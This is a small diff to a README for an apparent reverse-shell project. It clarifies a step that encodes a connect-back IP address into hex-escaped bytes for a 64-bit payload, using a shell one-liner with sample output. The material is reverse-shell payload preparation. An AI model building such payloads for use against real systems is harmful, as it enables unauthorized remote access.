@@ -41,7 +41,7 @@ https://github.com/David-Reguera-Garcia-Dreg/python_reverse_shell_detached_backg
 
 Steps for **64 bit process**:
 
-Generate IP str, for ex 51.195.45.136
+Generate IP str, for ex 51.195.45.136 (SPACES between numbers)
 ```
 xxd -p <<< `printf '%02X' 51 195 45 136` | sed 's/.$//' | sed 's/.$//' | sed 's/\(..\)/\\\\x&/g; s/, $//;'
 \\x33\\x33\\x43\\x33\\x32\\x44\\x38\\x38
